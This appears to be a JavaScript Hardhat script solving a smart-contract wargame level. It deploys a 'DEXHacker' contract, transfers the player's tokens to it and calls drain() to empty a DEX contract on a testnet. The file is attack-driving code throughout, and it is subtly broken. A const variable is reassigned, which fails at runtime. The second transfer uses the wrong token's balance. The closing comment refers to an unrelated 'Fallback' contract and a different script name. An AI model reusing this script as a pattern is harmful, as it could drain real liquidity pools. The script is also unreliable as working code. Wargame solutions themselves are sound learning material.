// We require the Hardhat Runtime Environment explicitly here. This is optional
// but useful for running the script in a standalone fashion through `node <script>`.
//
// You can also run a script with `npx hardhat run <script>`. If you do that, Hardhat
// will compile your contracts, add the Hardhat Runtime Environment's members to the
// global scope, and execute the script.
require('dotenv').config({ path: __dirname + '/.env' });

const { ethers } = require("hardhat");

async function main() {
    [player] = await ethers.getSigners();
    hacker = await (await ethers.getContractFactory("DEXHacker")).deploy(process.env.DEX_ADDRESS);
    await hacker.deployed();
    dex = await ethers.getContractAt("Dex", process.env.DEX_ADDRESS);
    token1 = await ethers.getContractAt("SwappableToken", await dex.token1());
    token2 = await ethers.getContractAt("SwappableToken", await dex.token2());

    const transactionResponse = await token1.transfer(hacker.address, await token1.balanceOf(player.address));
    await transactionResponse.wait();
    transactionResponse = await token2.transfer(hacker.address, await token1.balanceOf(player.address));
    await transactionResponse.wait();
    transactionResponse = await hacker.drain({gasLimit: 2_000_000});
    await transactionResponse.wait();
    console.log("address of hacker is ", hacker.address);
}

// We recommend this pattern to be able to use async/await everywhere
// and properly handle errors.
main().catch((error) => {
    console.error(error);
    process.exitCode = 1;
});
// run this script after Fallback contract was deployed
// npx hardhat run scripts/deploy.js --network goerli